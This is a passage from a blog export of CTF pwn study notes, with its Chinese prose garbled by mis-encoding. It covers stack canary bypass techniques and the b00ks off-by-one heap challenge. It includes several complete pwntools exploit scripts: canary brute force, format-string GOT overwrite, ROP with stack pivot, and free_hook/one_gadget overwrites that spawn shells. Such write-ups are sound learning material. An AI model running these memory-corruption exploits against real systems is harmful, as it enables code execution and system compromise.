canaryp.sendline(&#x27;a&#x27;*0x28+p64(canary)+&#x27;a&#x27;*8+p64(back_door))#gdb.attach(p,&#x27;b main&#x27;)p.interactive()\n\n\n\none by oneçˆ†ç ´one by oneçˆ†ç ´æ€æƒ³æ˜¯åˆ©ç”¨forkå‡½æ•°æ¥ä¸æ–­é€å­—èŠ‚æ³„éœ²ã€‚è¿™é‡Œä»‹ç»ä¸€ä¸‹forkå‡½æ•°ï¼Œforkå‡½æ•°ä½œç”¨æ˜¯é€šè¿‡ç³»ç»Ÿè°ƒç”¨åˆ›å»ºä¸€ä¸ªä¸åŸæ¥è¿›ç¨‹å‡ ä¹å®Œå…¨ç›¸åŒçš„è¿›ç¨‹ï¼Œè¿™é‡Œçš„ç›¸åŒä¹ŸåŒ…æ‹¬canaryã€‚å½“ç¨‹åºå­˜åœ¨forkå‡½æ•°å¹¶è§¦å‘canaryæ—¶ï¼Œ__ stack_chk_failå‡½æ•°åªèƒ½å…³é—­forkå‡½æ•°æ‰€å»ºç«‹çš„è¿›ç¨‹ï¼Œä¸ä¼šè®©ä¸»è¿›ç¨‹é€€å‡ºï¼Œæ‰€ä»¥å½“å­˜åœ¨å¤§é‡è°ƒç”¨forkå‡½æ•°æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒæ¥ä¸€å­—èŠ‚ä¸€å­—èŠ‚çš„æ³„éœ²ï¼Œæ‰€ä»¥å«åšone by oneçˆ†ç ´ã€‚\nbin1ç¨‹åºä¸­å­˜åœ¨forkå‡½æ•°ï¼Œè€Œä¸”è¿˜æ˜¯ä¸æ–­å¾ªç¯ï¼Œç¬¦åˆone by oneçˆ†ç ´æ¡ä»¶ï¼Œå› ä¸ºæ˜¯32ä½ç¨‹åºï¼Œcanaryç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯\\x00ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦çˆ†ç ´3ä¸ªå­—èŠ‚ï¼Œè¿™ä¸‰ä¸ªå­—èŠ‚å¯¹åº”çš„åå…­è¿›åˆ¶ç èŒƒå›´ä¸º00~FF\n\nçˆ†ç ´åŸç†ï¼š\næˆ‘ä»¬æ¯æ¬¡å°è¯•å¤šæº¢å‡ºä¸€å­—èŠ‚ï¼Œå¦‚æœæ¥æ”¶åˆ°è¿›ç¨‹é”™è¯¯é€€å‡ºå°±å°è¯•å¦ä¸€ç§å­—ç¬¦ï¼›å¦‚æœæ¥æ”¶åˆ°æ­£å¸¸è¿”å›å°±ç»§ç»­æº¢å‡ºä¸€å­—èŠ‚ï¼Œç›´åˆ°canaryè¢«å®Œå…¨æ³„éœ²ã€‚å› ä¸ºæ²¡æœ‰è¿œç«¯ç¯å¢ƒåŠ ä¸Šæ²¡æœ‰flagæ–‡ä»¶ï¼Œæ‰€ä»¥æ˜¯get flag error\n\nEXP12345678910111213141516171819202122232425262728from pwn import *local = 1elf = ELF(&#x27;./bin1&#x27;)if local:    p = process(&#x27;./bin1&#x27;)    libc = elf.libcelse:    p = remote(&#x27;&#x27;,)    libc = ELF(&#x27;./&#x27;)p.recvuntil(&#x27;welcome\\n&#x27;)canary = &#x27;\\x00&#x27;for k in range(3):    for i in range(256):        print &quot;index &quot; + str(k) + &quot;: &quot; + chr(i)        p.send(&#x27;a&#x27;*100 + canary + chr(i))        a = p.recvuntil(&quot;welcome\\n&quot;)        print a        if &quot;sucess&quot; in a:                canary += chr(i)                print &quot;canary: &quot; + canary                breakaddr = 0x0804863Bpayload = &#x27;A&#x27; * 100 + canary + &#x27;A&#x27; * 12 + p32(addr)p.send(payload)p.interactive()\n\n\n\nsspæ”»å‡»å½“ç¨‹åºæ£€æµ‹åˆ°æ ˆæº¢å‡ºæ—¶ï¼Œç¨‹åºä¼šæ‰§è¡Œ __ stack_chk_failå‡½æ•°ï¼Œè€Œ__ stack_chk_failå‡½æ•°ä½œç”¨æ˜¯é˜»æ–­ç¨‹åºç»§ç»­æ‰§è¡Œï¼Œå¹¶è¾“å‡ºargv[0]è­¦å‘Šï¼Œè€Œsspæ”»å‡»åŸç†æ˜¯é€šè¿‡è¾“å…¥è¶³å¤Ÿé•¿çš„å­—ç¬¦ä¸²è¦†ç›–æ‰argv[0]ï¼Œè¿™æ ·å°±èƒ½è®©canaryä¿æŠ¤è¾“å‡ºæˆ‘ä»¬æƒ³è¦åœ°å€ä¸Šçš„å€¼ã€‚\næ³¨æ„ï¼šè¿™ä¸ªæ–¹æ³•åœ¨glibc2.27åŠä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­å·²å¤±æ•ˆ\n12345678910111213141516void__attribute__ ((noreturn))__stack_chk_fail (void) &#123;\t__fortify_fail (&quot;stack smashing detected&quot;);&#125;void__attribute__ ((noreturn))__fortify_fail (msg)   const char *msg; &#123;      /* The loop is added only to keep gcc happy. */         while (1)              __libc_message (2, &quot;*** %s ***: %s terminated\\n&quot;, msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;) &#125;libc_hidden_def (__fortify_fail)\n\nä¸Šé¢æ˜¯ stack_chk_fail()å‡½æ•°çš„æºç ï¼Œåœ¨libc_messageå‡½æ•°ä¸­ç¬¬äºŒä¸ª%sè¾“å‡ºçš„å°±æ˜¯__libc_argv[0]ï¼Œargv[0]æ˜¯æŒ‡å‘ç¬¬ä¸€ä¸ªå¯åŠ¨å‚æ•°å­—ç¬¦ä¸²çš„æŒ‡é’ˆã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ ˆæº¢å‡ºå°†å…¶è¦†ç›–æˆæˆ‘ä»¬æƒ³è¦æ³„éœ²çš„åœ°å€ï¼Œå½“ç¨‹åºè§¦å‘åˆ°canaryæ—¶å°±å¯ä»¥æ³„éœ²æˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿äº†ã€‚\nsmashesé€šè¿‡åæ±‡ç¼–å‘ç°ç¨‹åºä¼šè¿›å…¥ä¸€ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¸­å­˜åœ¨getså±é™©å‡½æ•°ï¼Œå¯ä»¥åˆ©ç”¨å®ƒè¿›è¡Œæ ˆæº¢å‡ºæ“ä½œã€‚\nåœ¨å­—ç¬¦ä¸²çª—å£å‘ç°flagå­—æ ·ï¼Œæ ¹æ®æç¤ºæˆ‘ä»¬å¯ä»¥çŸ¥é“flagå°±åœ¨è¿™é‡Œï¼Œä¸è¿‡æ˜¯åœ¨è¿œç«¯ç¯å¢ƒä¸­\næ‰€ä»¥æˆ‘ä»¬åªè¦å°†argv[0]æŒ‡å‘è¿™ä¸ªåœ°å€å°±å¯ä»¥æ³„éœ²ã€‚\nä½†æ˜¯åé¢å‘ç°è¡Œä¸é€šï¼Œå¹¶æ²¡æœ‰æ³„éœ²æˆ‘ä»¬æƒ³è¦æ³„éœ²çš„åœ°å€é‡Œé¢çš„å€¼ã€‚\nå›åˆ°ä¼ªä»£ç é‡Œé¢å‘ç°ä¸‹é¢ä¸€è¡Œ\n1memset((void *)((signed int)v0 + 0x600D20LL), 0, (unsigned int)(32 - v0));\n\nè¿™è¡Œä»£ç ä¼šå°†0x600D20è¿™ä¸ªåœ°å€é‡Œé¢çš„å€¼æ¸…ç©ºï¼Œå¯¼è‡´flagè¢«æ¸…é™¤ã€‚çœ‹äº†ä¸€ä¸‹ä¸€äº›å¸ˆå‚…çš„åšå®¢äº†è§£åˆ°ELFçš„é‡æ˜ å°„ã€‚å½“å¯æ‰§è¡Œæ–‡ä»¶è¶³å¤Ÿå°çš„æ—¶å€™ï¼Œä»–çš„ä¸åŒåŒºæ®µå¯èƒ½ä¼šè¢«å¤šæ¬¡æ˜ å°„ã€‚ä¹Ÿå°±æ˜¯è¯´è¯¥flagä¼šåœ¨å…¶ä»–åœ°æ–¹è¿›è¡Œå¤‡ä»½ã€‚\n\nåŒæ—¶è¿˜è¦æ³¨æ„ä¸€ç‚¹ï¼Œ64ä½ä¸‹åœ°å€éƒ½æ˜¯8çš„å€æ•°æ‰€ä»¥æœ€ç»ˆæˆ‘ä»¬è¦æ³„éœ²çš„åœ°å€æ˜¯0x400d20\nEXP123456from pwn import *context.log_level = &#x27;debug&#x27;p = remote(&quot;pwn.jarvisoj.com&quot;,9877)p.recvuntil(&#x27;name? &#x27;)p.sendline(p64(0x400d20)*300)p.interactive()\n\n\n\nåŠ«æŒ___stack_chk_failcanaryä¿æŠ¤åŸç†æ— éå°±æ˜¯æ£€æµ‹åˆ°æº¢å‡ºåè°ƒç”¨ __ stack_chk_failå‡½æ•°ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿä¿®æ”¹ __ stack_chk_failå‡½æ•°çš„gotè¡¨ä¸ºåé—¨å‡½æ•°ï¼Œå½“æ£€æµ‹æº¢å‡ºè°ƒç”¨ __ stack_chk_failå‡½æ•°åï¼Œç¨‹åºå°±ä¸ä¼šé€€å‡ºå¹¶è­¦å‘Šè€Œæ˜¯æ‰§è¡Œæˆ‘ä»¬çš„åé—¨å‡½æ•°ã€‚\n[BJDCTF 2nd]r2t4è¿›å…¥IDAå¾ˆå®¹æ˜“å°±å‘ç°åé—¨å‡½æ•°\n\nç»§ç»­åˆ†æï¼Œç¨‹åºåªå­˜åœ¨ä¸€æ¬¡è¾“å…¥è¾“å‡ºï¼Œä½†è¾“å‡ºå´è°ƒç”¨printfå‡½æ•°ï¼Œä¹Ÿå°±å­˜åœ¨æ ¼å¼å­—ç¬¦ä¸²æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å…¶ä¿®æ”¹æˆ–æ³„éœ²ä»»æ„åœ°å€\n\næ‰¾åˆ°canryå¯¹åº”çš„åç§»å¹¶åˆ©ç”¨printfä¿®æ”¹ __ stack_chk_failå‡½æ•°çš„gotè¡¨\n\næœ€åè·å¾—flag\n\nEXP123456789from pwn import *p = process(&#x27;./r2t4&#x27;)elf = ELF(&#x27;r2t4&#x27;)back_door = 0x400626__stack_chk_fail_got = elf.got[&#x27;__stack_chk_fail&#x27;]payload = &quot;%64c%9$hn%1510c%10$hnAAA&quot; + p64(__stack_chk_fail_got+2) + p64(__stack_chk_fail_got)#gdb.attach(p)p.sendline(payload)p.interactive()\n\n\n\nä¿®æ”¹TLSç»“æ„ä½“å¦‚æœæˆ‘ä»¬æº¢å‡ºçš„è¶³å¤Ÿå¤§ï¼Œå¤§åˆ°èƒ½å¤Ÿè¦†ç›–åˆ°fs/gså¯„å­˜å™¨å¯¹åº”åç§»ä½çš„å€¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¿®æ”¹canaryä¸ºæˆ‘ä»¬è®¾è®¡å¥½çš„å€¼ï¼Œè¿™æ ·åœ¨ç¨‹åºæ£€æµ‹æ—¶å°±ä¼šå’Œæˆ‘ä»¬åŒ¹é…çš„å€¼è¿›è¡Œæ£€æµ‹ï¼Œä»è€Œç»•è¿‡canaryä¿æŠ¤ã€‚åœ¨åˆå§‹åŒ–canaryæ—¶ï¼Œfså¯„å­˜å™¨æŒ‡å‘çš„ä½ç½®æ˜¯TLSç»“æ„ä½“ï¼Œè€ŒfsæŒ‡å‘çš„ä½ç½®åŠ ä¸Š0x28åç§»çš„ä½ç½®å–å‡ºæ¥çš„canaryå°±åœ¨TLSç»“æ„ä½“é‡Œé¢ã€‚\nTLSç»“æ„ä½“å¦‚ä¸‹æ‰€ç¤ºï¼š\n\n\nCTF2018 babystackæ‹–è¿›IDAé‡Œé¢\n\nå­è¿›ç¨‹é‡Œé¢å…ˆè®©ç”¨æˆ·è¾“å…¥è¦è¾“å…¥çš„å¤§å°ï¼Œå¦‚æœå¤§äº0x1000å°±è¾“å‡ºè¿”å›ä¸è¿›è¡Œè¯»å–ï¼Œå¦‚æœå°äºç­‰äºå°±è¿›è¡Œè¯»å–\n\nsçš„å¤§å°æ˜¯0x1010æ¯”0x10000å°æ˜æ˜¾å­˜åœ¨æ ˆæº¢å‡ºï¼Œæˆ‘ä»¬å¯ä»¥ä»è¿™é‡Œæº¢å‡ºåˆ°TLSä¿®æ”¹canaryï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç¡®å®šcanaryçš„ä½ç½®\nè¿™é‡Œæˆ‘é‡‡å–çˆ†ç ´ï¼Œä¸æ–­å°è¯•è·å¾—canaryçš„ä½ç½®ã€‚å…ˆæ„å»ºå¥½ROPé“¾ï¼Œæ§åˆ¶ç¨‹åºè¿”å›åˆ°ä¸»å‡½æ•°ï¼Œè¿™æ ·è‚¯å®šä¼šè¢«æ£€æµ‹åˆ°å¼‚å¸¸é€€å‡ºï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬ä¸æ–­åŠ é•¿ROPé“¾ç›´åˆ°è¦†ç›–TLSå°±å¯ä»¥æˆåŠŸæ‰§è¡Œ\n\nç¡®å®šå¥½ä½ç½®ä»¥åå°±å¯ä»¥å¼€å§‹æ„é€ ROPé“¾ï¼Œæ³„éœ²åœ°å€putså‡½æ•°çš„åœ°å€ï¼Œè®¡ç®—å‡ºlibcbaseï¼Œæœ€ååˆ©ç”¨æ ˆè¿ç§»ï¼Œå†™one_gadget\nè·å–gadgets\n\nä¹‹åæ„é€ ROPé“¾\n12345678910111213payload = &#x27;a&#x27;*0x1010 payload += p64(fakestack)payload += p64(pop_rdi_ret)payload += p64(puts_got)payload += p64(puts_plt)payload += p64(pop_rdi_ret)payload += p64(0)payload += p64(pop_rsi_r15_ret)payload += p64(fakestack)payload += p64(0)payload += p64(read_plt)payload += p64(leave_ret)payload += &#x27;a&#x27;*(offset - len(payload))\n\n\np64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)è¾“å‡ºputsçš„åœ°å€\np64(pop_rdi_ret)+p64(0)+p64(pop_rsi_r15_ret)+p64(fakestack)+p64(0)+p64(read_plt)ç»„è£…readå‡½æ•°å‘fakestackå†™ä¸œè¥¿\n\nè·å–one_gadget\n\nEXP1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from pwn import *context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;p = process(&#x27;./babystack&#x27;)elf = ELF(&#x27;babystack&#x27;)libc = elf.libcmain_addr = 0x4009E7offset = 6128bss_start = elf.bss()fakestack = bss_start + 0x100pop_rdi_ret = 0x400c03pop_rsi_r15_ret = 0x400c01leave_ret = 0x400955read_plt = elf.symbols[&quot;read&quot;]puts_got = elf.got[&quot;puts&quot;]puts_plt = elf.symbols[&quot;puts&quot;]puts_libc = libc.symbols[&quot;puts&quot;]read_plt = elf.symbols[&quot;read&quot;]p.recvuntil(&quot;send?&quot;)p.sendline(str(offset))payload = &#x27;a&#x27;*0x1010 payload += p64(fakestack)payload += p64(pop_rdi_ret)payload += p64(puts_got)payload += p64(puts_plt)payload += p64(pop_rdi_ret)payload += p64(0)payload += p64(pop_rsi_r15_ret)payload += p64(fakestack)payload += p64(0)payload += p64(read_plt)payload += p64(leave_ret)payload += &#x27;a&#x27;*(offset - len(payload))p.send(payload)p.recvuntil(&quot;goodbye.\\n&quot;)puts_addr = u64(p.recv()[:6].ljust(8,&#x27;\\x00&#x27;))print hex(puts_addr)getshell_libc = 0x4527a #0x45226 0x4527a 0xf03a4 0xf1247base_addr = puts_addr - puts_libcone_gadget = base_addr + getshell_libcpayload2 = p64(0x12345678)payload2 += p64(one_gadget)p.send(payload2)p.interactive()\n\n\næ•°ç»„ä¸‹æ ‡è¶Šç•Œå½“ç¨‹åºä¸­å­˜åœ¨æ•°ç»„ï¼Œæ²¡æœ‰å¯¹è¾¹ç•Œè¿›è¡Œæ£€æŸ¥æ—¶ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥å¯¹æ•°ç»„è¿›è¡Œå¯¹åº”ä½ç½®ä¿®æ”¹ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç»•è¿‡canaryæ£€æµ‹ï¼Œç›´æ¥ä¿®æ”¹è¿”å›åœ°å€\nä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹arræ•°ç»„ä»»æ„ä½ç½®è¿›è¡Œä¿®æ”¹ï¼Œè¿™å°±å­˜åœ¨æ•°ç»„ä¸‹æ ‡æº¢å‡ºï¼Œä»¥ä¸‹å›¾ä¸ºä¾‹ï¼Œè¿”å›åœ°å€åœ¨æ•°ç»„ä¸­å°±ç›¸å½“äºarr[6]ï¼Œå¦‚æœæˆ‘ä»¬å¯¹arr[6]è¿›è¡Œä¿®æ”¹å°±æ˜¯å¯¹è¿”å›åœ°å€è¿›è¡Œä¿®æ”¹\n\nhomeworkç›´æ¥è¿›IDAé‡Œé¢è§‚å¯Ÿï¼Œå‘ç°å­˜åœ¨åé—¨å‡½æ•°\n\nç»§ç»­åˆ†æ\n\nè¿™é‡Œæ²¡æœ‰å¯¹æ•°ç»„è¿›è¡Œæ£€æŸ¥ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒæ¥ä¿®æ”¹è¿”å›åœ°å€ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾è¿”å›åœ°å€å¯¹åº”ä½ç½®\n\næ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å°†arr[14]ä¿®æ”¹æˆåé¢å‡½æ•°åœ°å€å³å¯æ‹¿åˆ°shell\nEXP1234567891011121314151617181920from pwn import *context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;gnome-terminal&#x27;,&#x27;-x&#x27;,&#x27;bash&#x27;,&#x27;-c&#x27;]context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)elf = ELF(&#x27;./homework&#x27;)p = process(&#x27;./homework&#x27;)libc = elf.libcp.recvuntil(&quot;What&#x27;s your name? &quot;)p.sendline(&quot;aaaa&quot;)p.recvuntil(&quot;4 &gt; dump all numbers&quot;)p.recvuntil(&quot; &gt; &quot;)gdb.attach(p)p.sendline(&quot;1&quot;)p.recvuntil(&quot;Index to edit: &quot;)p.sendline(&quot;14&quot;)p.recvuntil(&quot;How many? &quot;)system_addr = 0x080485FBp.sendline(str(system_addr))p.sendline(&#x27;0&#x27;)p.interactive()\n\n\nå‚è€ƒé“¾æ¥ï¼šhttps://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#more\n","slug":"ç»•è¿‡canaryçš„æ–¹æ³•","date":"2021-12-29T12:49:23.000Z","categories_index":"pwn","tags_index":"ç¬”è®°","author_index":"Krito"},{"id":"bd9db8b2380b14fbad4621ba09b4c803","title":"off-by-one","content":"ä»‹ç»off-by-one æŒ‡ç¨‹åºå‘ç¼“å†²åŒºä¸­å†™å…¥æ—¶ï¼Œå†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡äº†è¿™ä¸ªç¼“å†²åŒºæœ¬èº«æ‰€ç”³è¯·çš„å­—èŠ‚æ•°å¹¶ä¸”åªè¶Šç•Œäº†ä¸€ä¸ªå­—èŠ‚ã€‚è¿™ä¸ªå­—èŠ‚å¯èƒ½æ˜¯ä»»æ„å¯æ§çš„æˆ–è€…æ˜¯NULLå­—èŠ‚ã€‚ä»¥ä¸‹æ˜¯å¯¹ä¸¤ç§æƒ…å†µçš„åˆ©ç”¨æ–¹æ³•\n\næº¢å‡ºå­—èŠ‚ä¸ºå¯æ§åˆ¶ä»»æ„å­—èŠ‚ï¼šé€šè¿‡ä¿®æ”¹å¤§å°é€ æˆå—ç»“æ„ä¹‹é—´å‡ºç°é‡å ï¼Œä»è€Œæ³„éœ²å…¶ä»–å—æ•°æ®ï¼Œæˆ–æ˜¯è¦†ç›–å…¶ä»–å—æ•°æ®ã€‚ä¹Ÿå¯ä½¿ç”¨ NULL å­—èŠ‚æº¢å‡ºçš„æ–¹æ³•\næº¢å‡ºå­—èŠ‚ä¸º NULL å­—èŠ‚ï¼šåœ¨ size ä¸º 0x100 çš„æ—¶å€™ï¼Œæº¢å‡º NULL å­—èŠ‚å¯ä»¥ä½¿å¾— prev_in_use ä½è¢«æ¸…ï¼Œè¿™æ ·å‰å—ä¼šè¢«è®¤ä¸ºæ˜¯ free å—ã€‚ï¼ˆ1ï¼‰ è¿™æ—¶å¯ä»¥é€‰æ‹©ä½¿ç”¨ unlink æ–¹æ³•ï¼ˆè§ unlink éƒ¨åˆ†ï¼‰è¿›è¡Œå¤„ç†ã€‚ï¼ˆ2ï¼‰ å¦å¤–ï¼Œè¿™æ—¶ prev_size åŸŸå°±ä¼šå¯ç”¨ï¼Œå°±å¯ä»¥ä¼ªé€  prev_size ï¼Œä»è€Œé€ æˆå—ä¹‹é—´å‘ç”Ÿé‡å ã€‚æ­¤æ–¹æ³•çš„å…³é”®åœ¨äº unlink çš„æ—¶å€™æ²¡æœ‰æ£€æŸ¥æŒ‰ç…§ prev_size æ‰¾åˆ°çš„å—çš„å¤§å°ä¸prev_size æ˜¯å¦ä¸€è‡´ã€‚\n\nAsis CTF 2016 b00ksè¿™é“é¢˜æ˜¯ä¸€é“å…¸å‹çš„æº¢å‡º NULL å­—èŠ‚ã€‚\né¢˜ç›®åˆ†æé¢˜ç›®æ˜¯ä¸€ä¸ªå›¾ä¹¦ç®¡ç†ç³»ç»Ÿã€‚\n\nè¿›å…¥name autoré‡Œé¢çš„è¯»å–å‡½æ•°ä¼šå‘ç°å­˜åœ¨off by oneæ¼æ´\n\nä¹‹åè¿›å…¥createå‡½æ•°ï¼ˆè¿™é‡Œæˆ‘å¯¹å˜é‡åé‡å‘½åäº†ï¼‰ï¼Œé€šè¿‡åˆ†ææˆ‘ä»¬å¯ä»¥çŸ¥é“å›¾ä¹¦ç®¡ç†ç³»ç»Ÿçš„å¤§è‡´ç»“æ„\n\nåœ¨ä¸€æ®µbssæ®µä¸­ä¸“é—¨æœ‰è®°å½•book_contain_ptrçš„åœ°æ–¹ä»¥åŠæŒ‡å‘è¿™ä¸ªåœ°æ–¹çš„æŒ‡é’ˆï¼Œç¨‹åºé€šè¿‡è¿™ä¸ªæŒ‡é’ˆåŠ ä¸ŠIDä½œä¸ºåç§»å»å¯»æ‰¾å¯¹åº”çš„book_contain_ptrï¼Œä»è€Œæ‰¾åˆ°bookçš„ä¿¡æ¯\n\nåˆ†æå®Œä»¥åï¼Œæˆ‘ä»¬å¯ä»¥æ€è€ƒå¦‚ä½•åˆ©ç”¨off-by-oneæ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å®ƒæ³„éœ²bookçš„åœ°å€ï¼Œæœ‰äº†è¿™ä¸ªåœ°å€æˆ‘ä»¬å¯ä»¥å°†å…¶ä¿®æ”¹ä¸ºä¼ªé€ çš„bookï¼Œé€šè¿‡è¿™ä¸ªä¼ªé€ çš„bookå°±å¯ä»¥å¯¹å…¶ä»–bookè¿›è¡Œä¿®æ”¹æ“ä½œï¼Œæ¯”å¦‚ä¿®æ”¹å…¶ä»–booké‡Œé¢çš„containä»è€Œå®ƒä¿®æ”¹malloc_hookæˆ–è€…free_hookåœ°å€ä¸ºone_gadgetæœ€åæ‹¿åˆ°shellã€‚\nç¬¬ä¸€æ­¥ï¼Œåˆ›å»ºbook1å¹¶åˆ©ç”¨off-by-oneè·å–åœ°å€\n12345p.sendlineafter(&#x27;: &#x27;, &#x27;a&#x27;*0x20)add(0x90, &#x27;aaaa&#x27;, 0x90, &#x27;bbbb&#x27;)show()p.recvuntil(&#x27;a&#x27;*0x20)book1_contain_ptr = u64(p.recvuntil(&#x27;\\x0a&#x27;)[:-1].ljust(8, &#x27;\\x00&#x27;))\n\nç¬¬äºŒæ­¥ï¼Œåˆ›å»ºä¸€ä¸ªè¶³å¤Ÿå¤§çš„book2ï¼Œå¹¶è®¡ç®—å‡ºåœ°å€\n123add(0x21000, &#x27;cccc&#x27;, 0x21000, &#x27;dddd&#x27;)book2_contain_ptr = book1_contain_ptr + 0x30success(&#x27;book1_contain_ptr -&gt; &#123;&#125;&#x27;.format(hex(book1_contain_ptr)))\n\nç¬¬ä¸‰æ­¥ï¼Œä¼ªé€ book1_contain_ptrï¼ŒæŒ‡å‘book2_nameï¼Œå¹¶è·å–åœ°å€\n123456payload = &#x27;a&#x27; * 0x40 + p64(1) + p64(book2_contain_ptr + 8) * 2 + p64(0x1000)edit(1, payload)change_name(&#x27;a&#x27;*0x20)show()p.recvuntil(&#x27;Name: &#x27;)book2_name_ptr = u64(p.recv(6).ljust(8, &#x27;\\x00&#x27;))\n\n**è¿™é‡Œå¡«å……â€™aâ€™ * 40æ˜¯å› ä¸ºä¹‹å‰ä¿®æ”¹äº†book1_contain_ptrçš„æœ€åä¸€å­—èŠ‚ä¸º0ï¼ŒæŒ‡é’ˆä»åŸæœ¬0x564403ab0160å˜ä¸º0x564403ab0100ï¼Œæ‰€ä»¥åªè¦æˆ‘ä»¬å¡«å……åˆ°0x564403ab0100ï¼Œå°±å¯ä»¥å¯¹book1_containè¿›è¡Œä¼ªé€ ã€‚\nç¬¬å››æ­¥ï¼Œè®¡ç®—libcbaseï¼Œfree_hookï¼Œsystemåœ°å€\n\n123456libc_base = book2_name_ptr - 0x5b0010success(&#x27;book2_name_ptr -&gt; &#123;&#125;&#x27;.format(hex(book2_name_ptr)))free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]one_gadget = libc_base + 0x4527a #0x45226 0x4527a 0xf03a4 0xf1247system = libc_base + libc.sym[&#x27;system&#x27;]bin_sh = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()\n\nç¬¬äº”æ­¥ï¼Œåˆ©ç”¨ä¼ªé€ çš„book1ä¿®æ”¹book2æŒ‡å‘free_hookï¼Œåœ¨æ§åˆ¶book2ä¿®æ”¹free_hook\n123edit(1, p64(free_hook) + p64(free_hook))edit(2, p64(one_gadget))free(2)\n\nEXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667from pwn import *context.log_level = &#x27;debug&#x27;binary = &#x27;./b00ks&#x27;elf = ELF(binary)libc = elf.libclocal = 1if local:\tp = process(binary)else:\tp = remote(&#x27;&#x27;)def add(name_size, name, description_size, description):\tp.sendlineafter(&#x27;&gt; &#x27;, &#x27;1&#x27;)\tp.sendlineafter(&#x27;: &#x27;, str(name_size))\tp.sendlineafter(&#x27;: &#x27;, name)\tp.sendlineafter(&#x27;: &#x27;, str(description_size))\tp.sendlineafter(&#x27;: &#x27;, description)def free(index):\tp.sendlineafter(&#x27;&gt; &#x27;, &#x27;2&#x27;)\tp.sendlineafter(&#x27;: &#x27;, str(index))def edit(index, description):\tp.sendlineafter(&#x27;&gt; &#x27;, &#x27;3&#x27;)\tp.sendlineafter(&#x27;: &#x27;, str(index))\tp.sendlineafter(&#x27;: &#x27;, description)def show():\tp.sendlineafter(&#x27;&gt; &#x27;, &#x27;4&#x27;)def change_name(name):\tp.sendlineafter(&#x27;&gt; &#x27;, &#x27;5&#x27;)\tp.sendlineafter(&#x27;: &#x27;, name)p.sendlineafter(&#x27;: &#x27;, &#x27;a&#x27;*0x20)add(0x90, &#x27;aaaa&#x27;, 0x90, &#x27;bbbb&#x27;)show()p.recvuntil(&#x27;a&#x27;*0x20)book1_contain_ptr = u64(p.recvuntil(&#x27;\\x0a&#x27;)[:-1].ljust(8, &#x27;\\x00&#x27;))add(0x21000, &#x27;cccc&#x27;, 0x21000, &#x27;dddd&#x27;)book2_contain_ptr = book1_contain_ptr + 0x30success(&#x27;book1_contain_ptr -&gt; &#123;&#125;&#x27;.format(hex(book1_contain_ptr)))payload = &#x27;a&#x27; * 0x40 + p64(1) + p64(book2_contain_ptr + 8) * 2 + p64(0x1000)edit(1, payload)change_name(&#x27;a&#x27;*0x20)show()p.recvuntil(&#x27;Name: &#x27;)book2_name_ptr = u64(p.recv(6).ljust(8, &#x27;\\x00&#x27;))libc_base = book2_name_ptr - 0x5b0010success(&#x27;book2_name_ptr -&gt; &#123;&#125;&#x27;.format(hex(book2_name_ptr)))free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]one_gadget = libc_base + 0x4527a #0x45226 0x4527a 0xf03a4 0xf1247system = libc_base + libc.sym[&#x27;system&#x27;]bin_sh = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()edit(1, p64(free_hook) + p64(free_hook))edit(2, p64(one_gadget))free(2)p.interactive()\n\n","slug":"off-by-one","date":"2021-12-03T13:24:02.000Z","categories_index":"å­¦ä¹ è®°å½•","tags_index":"pwn","author_index":"Krito"},{"id":"c4bf9a47934395d80559cc60b6290065","title":"å †","content":"\n\n\n\n\n\n\n\n\nåœ¨æ ˆä¸Šæ‹–äº†å¥½ä¹…æ‰è¿›å…¥å †ï¼Œè¿™é‡Œå°±ä»‹ç»ä¸€ä¸‹è¿™å‡ å¤©æ‰€å­¦çš„å†…å®¹\nä»€ä¹ˆæ˜¯å †\nå †ä¸åŒäºæ ˆï¼Œæ ˆæ˜¯é™æ€åˆ†å¸ƒï¼Œä¹Ÿå°±æ˜¯ç¨‹åºåŠ è½½è¿›å†…å­˜å°±ä¼šåˆ†é…ï¼Œè€Œå †åˆ™æ˜¯åœ¨ç¨‹åºæ‰§è¡Œæ—¶éœ€è¦æ‰ä¼šåˆ†é…ï¼ˆç”±mallocã€allocã€reallocå‡½æ•°åˆ†é…å†…å­˜åå‡ºç°ï¼‰ã€‚\n\nå †å…¶å®å°±æ˜¯ç¨‹åºè™šæ‹Ÿåœ°å€ç©ºé—´çš„ä¸€å—è¿ç»­çš„çº¿æ€§åŒºåŸŸï¼Œç”Ÿé•¿æ–¹å‘ä¸æ ˆç›¸åï¼Œå †æ˜¯ç”±ä½åœ°å€å‘é«˜åœ°å€ç”Ÿé•¿ï¼Œè€Œæ 